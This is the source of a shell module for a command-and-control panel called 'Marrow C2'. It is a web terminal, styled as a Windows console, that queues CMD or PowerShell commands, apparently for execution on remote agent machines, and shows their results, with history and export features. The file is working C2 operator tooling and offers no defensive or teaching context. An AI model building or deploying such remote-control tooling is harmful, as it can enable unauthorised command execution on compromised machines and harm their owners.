<?php
// Marrow C2 - Shell Module
// Professional terminal emulator with command history
?>
<div id="shell-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-4">
            <span class="text-white font-medium">>_ Shell</span>
            <div class="flex items-center gap-1 bg-[#1a1f2e] rounded-lg p-1">
                <button onclick="SHELL.setMode('cmd')" id="shell-cmd-btn"
                    class="px-3 py-1.5 rounded-md text-xs font-medium transition-colors">
                    CMD
                </button>
                <button onclick="SHELL.setMode('powershell')" id="shell-ps-btn"
                    class="px-3 py-1.5 rounded-md text-xs font-medium transition-colors">
                    PowerShell
                </button>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <button onclick="SHELL.clear()"
                class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm text-gray-300">
                🗑️ Clear
            </button>
            <button onclick="SHELL.export()"
                class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm text-gray-300">
                💾 Export
            </button>
        </div>
    </div>

    <!-- Terminal -->
    <div id="shell-output" class="flex-1 overflow-auto p-4 font-mono text-sm bg-black"
        onclick="document.getElementById('shell-input').focus()">
        <div class="text-[#10b981] mb-2">Microsoft Windows [Marrow C2 Shell]</div>
        <div class="text-gray-500 mb-4">Type commands below. Use ↑/↓ for history.</div>
    </div>

    <!-- Input -->
    <div class="bg-[#0a0f1a] border-t border-[#1e2433] px-4 py-3">
        <div
            class="flex items-center gap-3 bg-black rounded-xl px-4 py-3 border border-[#1e2433] focus-within:border-[#6366f1] transition-colors">
            <span id="shell-prompt" class="text-[#10b981] font-mono text-sm">$</span>
            <input type="text" id="shell-input"
                class="flex-1 bg-transparent font-mono text-sm text-white focus:outline-none"
                placeholder="Enter command..." onkeydown="SHELL.handleKey(event)" autocomplete="off" spellcheck="false">
            <button onclick="SHELL.execute()"
                class="px-4 py-1.5 bg-[#6366f1] hover:bg-[#5558e3] text-white rounded-lg text-sm font-medium">
                Run
            </button>
        </div>
        <div class="flex items-center justify-between mt-2 text-xs text-gray-600">
            <span>Press Enter to execute • Ctrl+L to clear • ↑↓ for history</span>
            <span id="shell-history-count">History: 0</span>
        </div>
    </div>
</div>

<style>
    #shell-output .cmd-line {
        margin-bottom: 4px;
    }

    #shell-output .cmd-input {
        color: #10b981;
    }

    #shell-output .cmd-output {
        color: #d1d5db;
        padding-left: 16px;
        border-left: 2px solid #1e2433;
        margin-left: 8px;
        margin-top: 4px;
        margin-bottom: 8px;
        white-space: pre-wrap;
        word-break: break-all;
    }

    #shell-output .cmd-error {
        color: #ef4444;
    }

    .shell-mode-active {
        background: rgba(99, 102, 241, 0.2) !important;
        color: white !important;
    }

    #shell-input {
        caret-color: #10b981;
    }
</style>

<script>
    const SHELL = {
        mode: 'shell', // 'shell' for CMD, 'powershell' for PS
        history: [],
        historyIndex: -1,
        pendingCommand: null,

        init() {
            this.setMode('cmd');
            document.getElementById('shell-input').focus();
        },

        setMode(mode) {
            this.mode = mode === 'cmd' ? 'shell' : 'powershell';

            const cmdBtn = document.getElementById('shell-cmd-btn');
            const psBtn = document.getElementById('shell-ps-btn');
            const prompt = document.getElementById('shell-prompt');

            cmdBtn.classList.remove('shell-mode-active');
            psBtn.classList.remove('shell-mode-active');

            if (mode === 'cmd') {
                cmdBtn.classList.add('shell-mode-active');
                prompt.textContent = 'C:\\>';
                prompt.className = 'text-white font-mono text-sm';
            } else {
                psBtn.classList.add('shell-mode-active');
                prompt.textContent = 'PS>';
                prompt.className = 'text-[#6366f1] font-mono text-sm';
            }
        },

        handleKey(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.execute();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                this.navigateHistory(-1);
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                this.navigateHistory(1);
            } else if (e.key === 'l' && e.ctrlKey) {
                e.preventDefault();
                this.clear();
            }
        },

        navigateHistory(dir) {
            if (this.history.length === 0) return;

            this.historyIndex += dir;

            if (this.historyIndex < 0) this.historyIndex = 0;
            if (this.historyIndex >= this.history.length) {
                this.historyIndex = this.history.length;
                document.getElementById('shell-input').value = '';
                return;
            }

            document.getElementById('shell-input').value = this.history[this.historyIndex];
        },

        execute() {
            const input = document.getElementById('shell-input');
            const cmd = input.value.trim();

            if (!cmd) return;

            // Add to history
            this.history.push(cmd);
            this.historyIndex = this.history.length;
            document.getElementById('shell-history-count').textContent = `History: ${this.history.length}`;

            // Add command to output
            this.addLine(cmd, 'input');
            this.pendingCommand = cmd;

            // Queue command
            queueCommand(this.mode, cmd);

            // Clear input
            input.value = '';
        },

        addLine(text, type = 'output') {
            const output = document.getElementById('shell-output');
            const div = document.createElement('div');
            div.className = 'cmd-line';

            if (type === 'input') {
                const prompt = this.mode === 'shell' ? 'C:\\>' : 'PS>';
                div.innerHTML = `<span class="${this.mode === 'shell' ? 'text-white' : 'text-[#6366f1]'}">${prompt}</span> <span class="cmd-input">${this.esc(text)}</span>`;
            } else if (type === 'error') {
                div.innerHTML = `<div class="cmd-output cmd-error">${this.esc(text)}</div>`;
            } else {
                div.innerHTML = `<div class="cmd-output">${this.esc(text)}</div>`;
            }

            output.appendChild(div);
            output.scrollTop = output.scrollHeight;
        },

        handleResult(data) {
            if (data && data.length > 0) {
                this.addLine(data, data.toLowerCase().includes('error') ? 'error' : 'output');
            }
        },

        clear() {
            const output = document.getElementById('shell-output');
            output.innerHTML = `
            <div class="text-[#10b981] mb-2">Screen cleared</div>
        `;
        },

        export() {
            const output = document.getElementById('shell-output');
            const text = output.innerText;

            const blob = new Blob([text], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `shell_${Date.now()}.txt`;
            a.click();
            URL.revokeObjectURL(url);
        },

        esc(s) {
            const d = document.createElement('div');
            d.textContent = s || '';
            return d.innerHTML;
        }
    };

    // Initialize
    SHELL.init();
</script>